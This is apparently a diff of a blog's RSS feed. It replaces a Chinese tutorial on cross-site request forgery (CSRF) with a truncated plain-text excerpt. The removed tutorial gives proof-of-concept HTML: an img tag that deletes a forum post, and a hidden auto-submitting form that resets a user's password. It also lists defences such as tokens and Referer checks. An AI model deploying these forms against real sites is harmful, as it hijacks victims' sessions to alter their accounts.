@@ -8,7 +8,9 @@
     <language>en-us</language>
     <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
     <lastBuildDate>Tue, 28 Jun 2016 09:21:34 +0800</lastBuildDate>
-    <atom:link href="http://wyb0.com/tags/csrf/index.xml" rel="self" type="application/rss+xml" />
+    
+	<atom:link href="http://wyb0.com/tags/csrf/index.xml" rel="self" type="application/rss+xml" />
+    
     
     <item>
       <title>CSRF</title>
@@ -16,121 +18,11 @@
       <pubDate>Tue, 28 Jun 2016 09:21:34 +0800</pubDate>
       
       <guid>http://wyb0.com/posts/csrf/</guid>
-      <description>
-
-&lt;h3 id=&#34;0x00-概念:ecec67f2f40c7f982e7f00401614480c&#34;&gt;0x00 概念&lt;/h3&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;当你登陆某个网站时，通常浏览器与网站都会形成一个会话，在会话没有结束时你可以执行发表文章、发邮件、
-删除文章等操作，若会话结束，你再操作的话会提示你会话已经结束，请重新登陆。&lt;br /&gt;
-&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;CSRF就是：攻击者通过一些技术手段欺骗用户的&lt;font color=&#34;FF0000&#34;&gt;浏览器&lt;/font&gt;去&lt;font color=&#34;FF0000&#34;&gt;访问&lt;/font&gt;一个自己曾&lt;font color=&#34;FF0000&#34;&gt;认证过&lt;/font&gt;的网站并&lt;font color=&#34;FF0000&#34;&gt;执行某些操作&lt;/font&gt;。也可以说CSRF就是黑客利用受害者的Cookie骗取服务器的信任从而执行某些操作&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&#34;0x01-利用:ecec67f2f40c7f982e7f00401614480c&#34;&gt;0x01 利用&lt;/h3&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;利用条件&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;攻击者可以得知url的所有参数项并了解其含义&lt;/li&gt;
-&lt;li&gt;诱导用户访问构造好的POC&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;利用地方&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;操作是有意义的(比如:修改密码等)&lt;/li&gt;
-&lt;li&gt;验证过于简单(参数固定、我们可以设置参数)&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&#34;0x02-get型csrf攻击:ecec67f2f40c7f982e7f00401614480c&#34;&gt;0x02 GET型CSRF攻击&lt;/h3&gt;
-
-&lt;blockquote&gt;
-&lt;pre&gt;&lt;code&gt;若有论坛www.aa.com，论坛删除文章的操作是请求类似
-http://www.aa.com/opt.php?id=135&amp;amp;act=del&amp;amp;name=Tom的链接
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code&gt;有用户A，他登陆了论坛，且有篇文章id为251，那么他的浏览器此时已经取得了论坛的信任
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code&gt;此时有hacker用户B，他构造了一个html为b.html，b.html内容如下：
-&amp;lt;html&amp;gt;
-&amp;lt;head&amp;gt;
-    &amp;lt;title&amp;gt;test&amp;lt;/title&amp;gt;
-&amp;lt;/head&amp;gt;
-&amp;lt;body&amp;gt;
-    &amp;lt;img src=&amp;quot;http://www.aa.com/opt.php?id=251&amp;amp;act=del&amp;amp;name=A&amp;quot; /&amp;gt;
-&amp;lt;/body&amp;gt;
-&amp;lt;/html&amp;gt;
-将b.html放在他自己搭建的网站上，网址为http://www.bb.com/b.html
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code&gt;恶意用户B将链接http://www.bb.com/b.html通过qq发送给用户A，
-诱使他访问，用户A一旦访问，他id为251的文章就会被删除
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&#34;0x03-post型csrf攻击:ecec67f2f40c7f982e7f00401614480c&#34;&gt;0x03 POST型CSRF攻击&lt;/h3&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;若网站www.xx.com有让用户修改密码的功能，但验证过于简单，形如下图：
-
-&lt;div class=&#34;pure-u-1&#34;&gt;
-  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/csrf_post.png&#34; alt=&#34;csrf_post利用.png&#34;&gt;
-&lt;/div&gt;
-&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;
-&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
-&amp;lt;head&amp;gt;
-    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
-    &amp;lt;title&amp;gt;aa&amp;lt;/title&amp;gt;
-&amp;lt;/head&amp;gt;
-&amp;lt;body&amp;gt;
-    &amp;lt;form action=&amp;quot;http://172.23.10.200/index.php/User/Index/RegisterUpdate/id/286&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt;
-        昵称：&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;password&amp;quot; id=&amp;quot;password&amp;quot; class=&amp;quot;form-control&amp;quot; value=&amp;quot;xxxxx&amp;quot;&amp;gt;
-        用户名：&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;password&amp;quot; id=&amp;quot;password&amp;quot; class=&amp;quot;form-control&amp;quot; value=&amp;quot;xiaoming&amp;quot;&amp;gt;
-        密码：&amp;lt;input type=&amp;quot;password&amp;quot; name=&amp;quot;password&amp;quot; id=&amp;quot;password&amp;quot; class=&amp;quot;form-control&amp;quot; value=&amp;quot;&amp;quot;&amp;gt;
-        确认密码：&amp;lt;input type=&amp;quot;password&amp;quot; name=&amp;quot;cpassword&amp;quot; id=&amp;quot;conpassword&amp;quot; class=&amp;quot;form-control&amp;quot; value=&amp;quot;&amp;quot;&amp;gt;
-        &amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;button&amp;quot; value=&amp;quot;提交&amp;quot;&amp;gt;
-    &amp;lt;/form&amp;gt;
-&amp;lt;/body&amp;gt;
-&amp;lt;/html&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;此时我们就可以构造自动提交表单的xxxx.html，内容如下：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html&amp;gt;
-&amp;lt;head&amp;gt;
-    &amp;lt;title&amp;gt;aa&amp;lt;/title&amp;gt;
-&amp;lt;/head&amp;gt;
-&amp;lt;body onLoad=&amp;quot;document.forms[0].submit()&amp;quot;&amp;gt;
-    &amp;lt;form action=&amp;quot;http://172.23.10.200/index.php/User/Index/RegisterUpdate/id/286&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt;
-        &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;password&amp;quot; id=&amp;quot;password&amp;quot; value=&amp;quot;666666&amp;quot;&amp;gt;
-        &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;cpassword&amp;quot; id=&amp;quot;conpassword&amp;quot; value=&amp;quot;666666&amp;quot;&amp;gt;
-    &amp;lt;/form&amp;gt;
-&amp;lt;/body&amp;gt;
-&amp;lt;/html&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;然后将连接&lt;a href=&#34;http://www.bb.com/xxxx.html&#34;&gt;http://www.bb.com/xxxx.html&lt;/a&gt; 发送给用户,诱使他点击链接,一旦他点击,则密码就会被修改&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&#34;0x04-防御:ecec67f2f40c7f982e7f00401614480c&#34;&gt;0x04 防御：&lt;/h3&gt;
-
-&lt;ul&gt;
-&lt;li&gt;对于修改密码的表单可以要求输入原密码&lt;br /&gt;&lt;/li&gt;
-&lt;li&gt;二次确认(如删除用户、转账等重要操作弹窗要求用户确认)&lt;/li&gt;
-&lt;li&gt;Token认证&lt;br /&gt;
-
-&lt;ul&gt;
-&lt;li&gt;GET操作请求：可以在Cookie中存储Token&lt;br /&gt;&lt;/li&gt;
-&lt;li&gt;POST操作请求：可以在form表单中添加一个隐藏的input标签，value值为Token&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;验证Referer&lt;/li&gt;
-&lt;/ul&gt;
-</description>
+      <description>0x00 概念  &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;当你登陆某个网站时，通常浏览器与网站都会形成一个会话，在会话没有结束时你可以执行发表文章、发邮件、 删除文章等操作，若会话结束，你再操作的话会提示你会话已经结束，请重新登陆。
+&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;CSRF就是：攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾认证过的网站并执行某些操作。也可以说CSRF就是黑客利用受害者的Cookie骗取服务器的信任从而执行某些操作
+ 0x01 利用  利用条件
+ 攻击者可以得知url的所有参数项并了解其含义 诱导用户访问构造好的POC  利用地方
+ 操作是有意义的(比如:修改密码等) 验证过于简单(参数固定、我们可以设置参数)   0x02 GET型CSRF攻击  若有论坛www.aa.com，论坛删除文章的操作是请求类似 http://www.aa.com/opt.php?id=135&amp;amp;act=del&amp;amp;name=Tom的链接  有用户A，他登陆了论坛，且有篇文章id为251，那么他的浏览器此时已经取得了论坛的信任  此时有hacker用户B，他构造了一个html为b.html，b.html内容如下： &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;test&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;img src=&amp;quot;http://www.aa.com/opt.php?id=251&amp;amp;act=del&amp;amp;name=A&amp;quot; /&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; 将b.html放在他自己搭建的网站上，网址为http://www.bb.com/b.html  恶意用户B将链接http://www.bb.com/b.html通过qq发送给用户A， 诱使他访问，用户A一旦访问，他id为251的文章就会被删除   0x03 POST型CSRF攻击  若网站www.xx.com有让用户修改密码的功能，但验证过于简单，形如下图： &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt; &amp;lt;title&amp;gt;aa&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;form action=&amp;quot;http://172.23.10.200/index.php/User/Index/RegisterUpdate/id/286&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt; 昵称：&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;password&amp;quot; id=&amp;quot;password&amp;quot; class=&amp;quot;form-control&amp;quot; value=&amp;quot;xxxxx&amp;quot;&amp;gt; 用户名：&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;password&amp;quot; id=&amp;quot;password&amp;quot; class=&amp;quot;form-control&amp;quot; value=&amp;quot;xiaoming&amp;quot;&amp;gt; 密码：&amp;lt;input type=&amp;quot;password&amp;quot; name=&amp;quot;password&amp;quot; id=&amp;quot;password&amp;quot; class=&amp;quot;form-control&amp;quot; value=&amp;quot;&amp;quot;&amp;gt; 确认密码：&amp;lt;input type=&amp;quot;password&amp;quot; name=&amp;quot;cpassword&amp;quot; id=&amp;quot;conpassword&amp;quot; class=&amp;quot;form-control&amp;quot; value=&amp;quot;&amp;quot;&amp;gt; &amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;button&amp;quot; value=&amp;quot;提交&amp;quot;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;  此时我们就可以构造自动提交表单的xxxx.</description>
     </item>
     
   </channel>
